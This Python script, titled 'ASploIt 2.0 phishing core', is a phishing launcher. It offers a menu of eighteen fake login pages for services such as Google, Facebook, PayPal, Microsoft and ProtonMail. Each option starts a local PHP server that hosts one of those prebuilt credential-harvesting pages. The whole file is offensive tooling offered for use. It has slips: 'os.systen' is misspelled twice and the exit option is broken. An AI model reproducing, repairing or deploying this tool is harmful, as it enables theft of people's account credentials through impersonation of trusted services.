###########################################
##ASploIt 2.0 phishing core################
###########################################
######################
##Devoloped By Jamie##
######################

import os
import subprocess

os.system("clear");
os.system("toilet -f mono12 a-phish 2.0");

print("1.Google Phishing Page ");
print("2.Facebook Phishing Page");
print("3.Instagram Phishing Page");
print("4.Snapchat Phishing Page");
print("5.Twitter Phishing Page");
print("6.AdobeID Phishing Page");
print("7.MicroSoftAccount Phishing Page");
print("8.SteamAccount Phishing Page");
print("9.Netflix Phishing Page");
print("10.MySpaceAccount Phishing Page");
print("11.YahooMail Phishing Page");
print("12.YandexAccount Phishing Page");
print("13.WordPressAdminLogin 5.2 Phishing Page");
print("14.PayPalAccount Phishing Page");
print("15.pinterest Phishing Page");
print("16.LinkedInAccount Phishing Page");
print("17.ProtonMail Phishing Page");
print("18.Shopify Phishing Page");
print("19.Exit");

choice = int(input("ENTER CHOICE :"));

if choice ==1:
 os.system("cd sites && php -S 127.0.0.1:4444 -t google");

if choice ==2:
 os.system("cd sites && php -S 127.0.0.1:4444 -t facebook");

if choice ==3:
 os.system("cd sites && php -S 127.0.0.1:4444 -t instagram");

if choice ==4:
 os.system("cd sites && php -S 127.0.0.1:4444 -t snapchat");

if choice ==5:
 os.system("cd sites && php -S 127.0.0.1:4444 -t twitter");

if choice==6:
 os.system("cd sites && php -S 127.0.0.1:4444 -t adobe");

if choice==7:
 os.system("cd sites && php -S 127.0.0.1:4444 -t microsoft");

if choice==8:
 os.systen("cd sites && php -S 127.0.0.1:4444 -t steam");

if choice==9:
 os.system("cd sites && php -S 127.0.0.1:4444 -t netflix");

if choice==10:
 os.system("cd sites && php -S 127.0.0.1:4444 -t myspace");

if choice==11:
 os.systen("cd sites && php -S 127.0.0.1:4444 -t yahoo");

if choice==12:
 os.system("cd sites && php -S 127.0.0.1:4444 -t yandex");

if choice==13:
 os.system("cd sites && php -S 127.0.0.1:4444 -t wordpress");

if choice==14:
 os.system("cd sites && php -S 127.0.0.1:4444 -t paypal");

if choice==15:
 os.system("cd sites && php -S 127.0.0.1:4444 -t pinterest");

if choice==16:
 os.system("cd sites && php -S 127.0.0.1:4444 -t linkedin");

if choice==17:
 os.system("cd sites && php -S 127.0.0.1:4444 -t protonmail");

if choice==18:
 os.system("cd sites && php -S 127.0.0.1:4444 -t shopify");

if choice==19:
 exit;
